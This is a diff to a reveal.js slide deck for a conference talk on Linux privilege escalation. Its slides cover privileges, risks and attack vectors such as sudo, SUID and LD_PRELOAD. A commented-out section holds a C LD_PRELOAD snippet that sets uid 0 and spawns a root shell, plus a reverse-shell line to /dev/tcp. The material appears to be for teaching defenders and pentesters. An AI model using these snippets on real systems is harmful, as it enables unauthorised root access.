@@ -4,20 +4,169 @@
 		<meta charset="utf-8">
 		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
-		<title>reveal.js</title>
+		<title>Aut LinuxFest 2025</title>
 
 		<link rel="stylesheet" href="dist/reset.css">
 		<link rel="stylesheet" href="dist/reveal.css">
 		<link rel="stylesheet" href="dist/theme/black.css">
 
 		<!-- Theme used for syntax highlighted code -->
-		<link rel="stylesheet" href="plugin/highlight/monokai.css">
+		<!-- <link rel="stylesheet" href="plugin/highlight/monokai.css"> -->
+		<link rel="stylesheet" href="css/custom.css">
+		<link rel="stylesheet" href="plugin/highlight/atom-one-dark-reasonable.min.css">
+
 	</head>
 	<body>
 		<div class="reveal">
 			<div class="slides">
-				<section>Slide 1</section>
-				<section>Slide 2</section>
+
+				<section class="text-left">
+					<h1 style="color: rgb(0, 195, 255);">bio</h1>
+					Kourosh Rajabzadeh<br>
+					Bachelor of Computer Engineering at AUT<br>
+					Cyber Security | CTF Player<br>
+				</section>
+
+
+				<section class="text-left">
+					<p style="color: rgb(0, 195, 255);">Overview</p>
+					<p class="fragment">Useful for?</p>
+					<p class="fragment">Linux PE Definition</p>
+					<p class="fragment">Attack Vectors (Discovery and Exploit)</p>
+					<p class="fragment">Solution (Detection and Mitigation)</p>
+					<p class="fragment">Conslusion</p>
+				</section>
+
+
+				<section class="text-left">
+					<p style="color: rgb(0, 195, 255);">Useful for :</p>
+					<p class="fragment">Linux sysadmins</p>
+					<p class="fragment">Pentesters / Red Teamers</p>
+					<p class="fragment">SOC / Blue Teamers</p>
+					<p class="fragment">DevOps / DevSecOps Engineers</p>
+				</section>
+
+				<section>Privilege Escalation in Linux
+					<section class="text-left">
+						<p style="color: rgb(0, 195, 255);">Privilege Escalation in Linux</p>
+						<p class="fragment">What are privileges in Linux?</p>
+						<p class="fragment">What is privilege escalation?</p>
+						<p class="fragment">Risks?</p>
+					</section>
+					
+					<section class="text-left">
+						<p style="color: rgb(150, 212, 231);">What are privileges in Linux?</p>
+						<p class="fragment" data-fragment-index="1">any rights or authorities</p>
+						<p class="fragment" data-fragment-index="2">beyond file permissions</p>
+						<p class="fragment" data-fragment-index="3">it can be anything including:</p>
+						
+						<ul>
+							<li class="fragment" data-fragment-index="4">
+								<div class="fragment highlight-red" data-fragment-index="9">
+									permissions over files
+								</div>
+							</li>
+							<li class="fragment" data-fragment-index="5">
+								<div class="fragment highlight-red" data-fragment-index="9">
+									sudo privileges
+								</div>
+							</li>
+							<li class="fragment" data-fragment-index="6">
+								<div class="fragment highlight-red" data-fragment-index="9">
+									executables (context)
+								</div>
+							</li>
+							<li class="fragment" data-fragment-index="7">
+								users and groups
+							</li>
+							<li class="fragment" data-fragment-index="8">
+								capabilities
+							</li>
+						</ul>
+
+						
+					</section>
+
+					<section class="text-left">
+						<p style="color: rgb(150, 212, 231);">What is privilege escalation?</p>
+						<p class="fragment">any abuse to extend and increase the rights</p>
+						<p class="fragment">it is against the policies</p>
+						<p class="fragment">risks instead of benefits</p>					
+					</section>
+
+					<section class="text-left">
+						<p style="color: rgb(150, 212, 231);">Risks?</p>
+						<p class="fragment">access to sensitive data</p>
+						<p class="fragment">execute malicious code</p>
+						<p class="fragment">takeover whole system</p>
+					</section>
+				
+				</section>
+					
+					
+				<section>Attack Vectors (Discover and Exploit) Overview
+					<section class="text-left">
+						<ul>
+							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="1">OS Vulnerabilities (CVE)</li>
+							<ul class="fragment" data-fragment-index="2">
+								<li style="font-size: 0.5em;">Kernel</li>
+								<li style="font-size: 0.5em;">OS Services</li>
+								<li style="font-size: 0.5em;">Local Port/Services (MySQL, Redis, )</li>
+								<li style="font-size: 0.5em;">Binaries (sudo, …)</li>
+							</ul>
+							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="3">Credentials/SSH Keys Leakage</li>
+							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="4">File Permissions</li>
+							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="5">Sudo</li>
+							<ul class="fragment" data-fragment-index="6">
+								<li style="font-size: 0.5em;">NOPASSWD</li>
+								<li style="font-size: 0.5em;">secure_path</li>
+								<li style="font-size: 0.5em;">dangerous binaries</li>
+								<li style="font-size: 0.5em;">env_keep (PATH, PYTHONPATH, LD_PRELOAD)</li>
+	
+							</ul>
+							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="7">Cronjob</li>
+							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="8">Capability</li>
+							<li class="fragment" style="font-size: 0.7em; color: rgb(150, 212, 231);" data-fragment-index="9">SUID, SGID</li>
+							<li style="font-size: 0.7em; color: rgb(150, 212, 231);"  class="fragment" data-fragment-index="10">
+								<div class="fragment highlight-red grow" data-fragment-index="11">
+									Custom Developed Scripts
+								</div>
+							</li>
+						</ul>
+
+					</section>
+
+
+				</section>
+				<!-- <section data-markdown>
+					<textarea data-template>
+						## Bio
+						Kourosh Rajabzadeh
+
+						Bachelor of Computer Engineering at AUT
+
+						Penetration Tester | CTF Player
+						---
+						## Slide 2
+						---
+						## Slide 3
+						```cpp [1-2|3|4]
+						#include &lt;stdio.h&gt;
+						#include &lt;stdlib.h&gt;
+						#include &lt;unistd.h&gt;
+						
+						void _init() {
+							unsetenv("LD_PRELOAD");
+							setuid(0);
+							setgid(0);
+							system("/bin/bash -p");
+							// system("bash -c 'bash -i >& /dev/tcp/127.0.0.1/10001 0>&1'");
+						}
+						---
+						### slide 3.1
+						```
+					</textarea>
+				</section> -->
 			</div>
 		</div>
 
